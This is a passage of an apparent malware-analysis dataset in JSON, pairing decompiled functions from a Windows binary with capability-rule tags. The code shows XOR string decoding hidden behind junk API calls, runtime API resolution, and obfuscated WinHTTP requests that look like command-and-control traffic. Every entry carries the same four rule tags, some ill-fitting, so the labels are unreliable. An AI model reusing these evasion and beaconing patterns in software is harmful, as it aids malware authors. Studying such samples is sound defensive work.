!= 0) {\n                            fcn.004066ce();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_44h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_44h;\n                    iVar6 = var_64h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2088
    },
    "004084a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004084a4(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41dad4 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41dae0, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41db18;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00405a39();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405855, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4132f0) = *(uVar5 + 0x4132f0) ^ \"RlowA8erZ\"[uVar5 % 9];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4176f0) = *(uVar5 + 0x4176f0) ^ *(uVar5 % 0xc + 0x41d8f0);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040552c, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41dd68 == 0) {\n        fcn.00405076();\n        if (*0x41dad4 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 677
    },
    "00409526": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00409526(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.00405076();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 274
    },
    "00409590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00409590(void)\n\n{\n    int32_t iVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0x278cdf58;\n    iVar1 = 0;\n    var_bch = 0x2d386ece;\n    var_b8h = 0xaba416e3;\n    var_b4h = 0xbffde1f0;\n    var_b0h = 0x6fadb57b;\n    var_ach = 0x581419ac;\n    var_a8h = 0xa93a5da5;\n    var_a4h = 0x9fe09b81;\n    var_a0h = 0x62b621c4;\n    var_9ch = 0xe2f42d3;\n    var_98h = 0x1cb3f267;\n    var_94h = 0x7deed7db;\n    var_90h = 0x487c3558;\n    var_8ch = 0xbc541011;\n    var_88h = 0x70f400cf;\n    var_84h = 0x7e11e4cf;\n    var_80h = 0x52feb192;\n    var_7ch = 0x1e24d477;\n    var_78h = 0x4a6b6ebc;\n    var_74h = 0x6de558e4;\n    var_70h = 0x6e4851f8;\n    var_6ch = 0x9f5462ed;\n    var_68h = 0x896773d7;\n    var_64h = 0x68b0f30d;\n    var_60h = 0x7b8b2670;\n    var_5ch = 0x1e84d9c6;\n    var_58h = 0xf9b64044;\n    var_54h = 0x11e91917;\n    var_50h = 0x7ec953ab;\n    var_4ch = 0xafb3480;\n    var_48h = 0x5d5421cf;\n    var_44h = 0x4055c0a5;\n    var_40h = 0xb4c2ed27;\n    var_3ch = 0x6751a7a7;\n    var_38h = 0xf0fc4f7;\n    var_34h = 0xbf550eed;\n    var_30h = 0x1b54824;\n    var_2ch = 0x72c7bd89;\n    var_28h = 0xb15afa72;\n    var_24h = 0xd35c5e5c;\n    var_20h = 0x86bd8b3a;\n    var_1ch = 0x334b7fa5;\n    var_18h = 0x47e5605f;\n    var_14h = 0xe1e54873;\n    var_10h = 0xd8367b99;\n    do {\n        var_4h = 0;\n        fcn.00405076();\n        if (var_4h != 0) {\n            return 1;\n        }\n        var_8h = (&var_bch)[iVar1];\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 1108
    },
    "004098f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004098f6(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41db14 == NULL) {\n        var_2ch = 0x293d2418;\n        var_28h = 0x3a63673b;\n        var_24h = 0x32322334;\n        var_20h._0_2_ = 0x3519;\n        var_20h._2_1_ = 0x4c;\n        var_1ch = 0x466a5751;\n        var_18h._0_1_ = 0x4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            if (iVar5 != 0x6626e4) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x2a18513a;\n        var_28h = 0x58073d54;\n        var_24h = 0x583d556a;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6a);\n        var_1ch = 0x446a3451;\n        var_18h._0_1_ = 0x31;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            iVar5 = var_10h;\n            if (iVar6 != 0x3644e2) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41db14 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41db14 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41db14)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1018
    },
    "0040a8cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a8cb(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.004098f6();\n    fcn.0040a020(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040a020(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040a9d2:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x0040a9f3;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040a9bd;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040a9d2;\ncode_r0x0040a9bd:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040a9f3;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040a9f3:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 834
    },
    "0040b282": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040b282(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x0040b2c0:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040bad5(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x0040b2e4:\n            fcn.0040cd6f();\n            goto code_r0x0040b2eb;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040cd6f();\n            goto code_r0x0040b2c0;\n        }\n        if (uVar1 < 5) goto code_r0x0040b2e4;\n        if (*puVar2[1] == uVar1) {\ncode_r0x0040b2eb:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 333
    },
    "0040b2fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl\nfcn.0040b2fb(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    ushort *puVar6;\n    code *pcVar7;\n    uint var_41ch;\n    uint lpszHeaders;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_100h;\n    int32_t var_fch;\n    uint lpdwBufferLength;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e3h;\n    uint var_dfh;\n    uint var_dbh;\n    uint var_d7h;\n    uint var_d3h;\n    uint var_cfh;\n    uint var_c9h;\n    uint var_c5h;\n    uint var_c1h;\n    uint var_bdh;\n    uint var_b9h;\n    uint var_b5h;\n    uint var_b1h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint lpBuffer;\n    uint *var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    uint *hRequest;\n    int32_t lpMultiByteStr;\n    ushort var_38h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar4 = 0x100; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_41ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_104h = 0;\n        var_108h = 0x34367964;\ncode_r0x0040b370:\n        var_10ch = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_104h = 0;\ncode_r0x0040b366:\n            var_108h = 0x32337964;\n            goto code_r0x0040b370;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_104h = 0x30;\n            goto code_r0x0040b366;\n        }\n    }\n    hRequest = &var_10ch;\n    if (lpdwNumberOfBytesRead != NULL) {\n        hRequest = lpdwNumberOfBytesRead;\n    }\n    iVar4 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar4 == 0) {\n        return 0x3;\n    }\n    lpdwNumberOfBytesAvailable = 0x5;\n    lpdwNumberOfBytesRead = 0x6;\n    if (*0x41dd5c == 0) {\n        var_f4h = 0x720b323d;\n        var_f0h = 0x645b703f;\n        var_ech = 0x321c451e;\n        var_e8h._0_1_ = 5;\n        stack0xffffff15 = 0x7706a72;\n        var_e3h = 0x40455c64;\n        var_dfh = 0x6d724432;\n        var_dbh = 0x1b646570;\n        var_d7h = 0x321e45;\n        var_d3h = 0x45702a72;\n        var_cfh._0_1_ = 100;\n        var_cfh._1_1_ = 1;\n        stack0xffffff2f = 0x2a325045;\n        var_c9h = 0x12701172;\n        var_c5h = 0x5e454464;\n        var_c1h = 0x7e725532;\n        var_bdh = 0x25641270;\n        var_b9h = 0xa321945;\n        var_b5h._0_2_ = 0x7372;\n        var_b5h._2_1_ = 0x70;\n        var_b5h._3_1_ = 6;\n        var_b1h = 0x50454964;\n        var_adh = 0x73721c32;\n        var_a9h._0_1_ = 0x70;\n        stack0xffffff55 = 0x50454964;\n        var_a3h = 0x33721632;\n        var_9fh = 0x40640870;\n        var_9bh = 0x4a324545;\n        var_97h = 0x1b707572;\n        var_93h = 0x37455264;\n        var_8fh._0_1_ = 0x32;\n        var_8fh._1_1_ = 1;\n        stack0xffffff6f = 0x59702672;\n        var_89h = 0x5f451d64;\n        var_85h = 0x74725632;\n        var_81h = 0x42640270;\n        var_7dh = 0x55324045;\n        var_79h = 0x3707572;\n        var_75h = 0x36455264;\n        var_71h = 0x37720d32;\n        var_6dh = 0x14645770;\n        var_69h = 0x1c321f45;\n        var_65h = 0x706a72;\n        var_61h = 0x5e454764;\n        var_5dh = 0x45725432;\n        var_59h._0_1_ = 0x70;\n        var_14h = 0x72643270;\n        var_10h._0_1_ = 0x45;\n        var_a9h._1_1_ = var_b5h._3_1_;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        var_48h = &var_f4h - iVar4;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar2 != 0x1e92e4) {\n                *(iVar5 + iVar4) = *(&var_14h + iVar5 % lpdwNumberOfBytesAvailable) ^ (iVar5 + iVar4)[var_48h];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x9c);\n        *0x41dd5c = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar4, 0, 0, 0, 0);\n        if (*0x41dd5c == 0) {\n            uVar1 = (*pcVar7)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return 0x1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41dd5c, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar7)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar6 = NULL;\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar7)(8, (iVar4 + 1) * 2);\n        puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *puVar6 = 0;\n        lpdwNumberOfBytesAvailable = puVar6;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar6, iVar4 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41dd5c, puVar6, 0x50, 0);\n    _var_35h = CONCAT31(0x4c5831, var_35h);\n    var_34h._3_1_ = 100;\n    var_30h = 0x58294d1b;\n    var_2ch._0_1_ = 0x4b;\n    var_2ch._1_1_ = 100;\n    var_2ch._2_1_ = 0x55;\n    stack0xffffffd3 = 0x1758764d;\n    var_28h._3_1_ = 100;\n    var_24h = 0x582a4d4a;\n    var_20h = 0x4d4a6402;\n    var_1ch = 0x6417583d;\n    var_18h._0_1_ = 0x6f;\n    var_18h._1_1_ = 0x4d;\n    var_ch = 0x64385859;\n    var_8h._0_2_ = 0x4d6f;\n    uVar1 = (*pcVar7)(8, 0x3d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_14h = &var_34h - iVar4;\n    var_48h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar6 = lpdwNumberOfBytesAvailable;\n        if (iVar2 != 0xa23f73) {\n            *(iVar5 + iVar4) = *(&var_ch + iVar5 % lpdwNumberOfBytesRead) ^ (iVar5 + iVar4)[var_14h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, lpdwNumberOfBytesAvailable, 0x50);\n    uVar1 = (*pcVar7)(0, puVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = hRequest;\n    puVar6 = 0x1;\n    if (lpMultiByteStr == 0) goto code_r0x0040bab0;\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_50h = 0x7324580c;\n    var_4ch = 0x584b591f;\n    var_ch = 0x7361584b;\n    var_8h._0_2_ = 0x594b;\n    uVar1 = (*pcVar7)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    hRequest = &var_50h - iVar5;\n    var_14h = iVar5;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != 0x3cb9c9) {\n            *(iVar4 + iVar5) = *(&var_ch + iVar4 % lpdwNumberOfBytesRead) ^ (iVar4 + iVar5)[&var_50h - iVar5];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    puVar3 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, iVar5, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar3;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar4 = var_48h;\n    if (puVar3 == NULL) {\ncode_r0x0040ba8a:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_110h = 0x3300;\n        var_114h = 8;\n        iVar2 = fcn.00401f2c();\n        if (iVar2 != 0) {\n            var_4ch = 0;\n            var_50h = &var_41ch;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x1f, &var_110h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x3f, &var_114h, 4);\n        if (arg_18h != 0) {\n            var_36h = 5;\n            var_38h = 0x4e3f;\n            _var_35h = 0xa681a30;\n            var_34h._3_1_ = 0x4e;\n            var_30h = 0x684e3001;\n            var_2ch._0_1_ = 0x4d;\n            var_2ch._1_1_ = 0x4e;\n            var_2ch._2_1_ = 6;\n            stack0xffffffd3 = 0x19680d30;\n            var_28h._3_1_ = 0x4e;\n            var_24h = 0x68073001;\n            var_20h = 0x30414e50;\n            var_1ch = 0x4e406810;\n            var_18h._0_1_ = 100;\n            var_18h._1_1_ = 0x30;\n            var_ch = 0x30644e6d;\n            var_8h._0_2_ = 0x6874;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar5 = 0;\n            lpdwNumberOfBytesAvailable = &var_38h - iVar4;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar2 != 0x6e4f0d) {\n                    *(iVar5 + iVar4) =\n                         *(&var_ch + iVar5 % lpdwNumberOfBytesRead) ^ *((&var_38h - iVar4) + iVar5 + iVar4);\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, arg_18h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar3 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar4 = var_48h;\n            iVar5 = var_14h;\n        }\n        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar3, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar3, 0),  iVar2 == 0))\n        goto code_r0x0040ba8a;\n        lpdwBufferLength = 4;\n        var_100h = 0;\n        var_fch = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000005, 0, &var_100h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_100h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000013, 0, &var_fch, &lpdwBufferLength, 0);\n        if ((var_fch == 0xce) || (var_fch == 200)) {\n            if (var_44h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_100h);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_44h = 0;\n                var_44h[1] = iVar2;\n            }\n            arg_18h = var_44h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                